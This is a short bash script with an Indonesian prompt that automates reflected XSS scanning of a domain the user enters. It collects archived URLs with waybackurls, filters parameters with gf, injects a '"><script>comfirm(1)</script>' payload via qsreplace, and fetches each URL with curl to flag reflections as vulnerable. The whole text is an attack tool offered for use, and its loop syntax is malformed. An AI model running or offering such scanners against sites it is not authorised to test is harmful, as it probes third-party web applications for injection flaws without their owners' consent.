#!/bin/bash

echo "Masukkan target domain : "
read target

waybackurls $target | tee -a $target.txt

cat $target.txt| gf xss | grep 'source=' | qsreplace '"><script>comfirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>comfirm(1)" && echo "$host \033[0;31mVulnerable\n"; done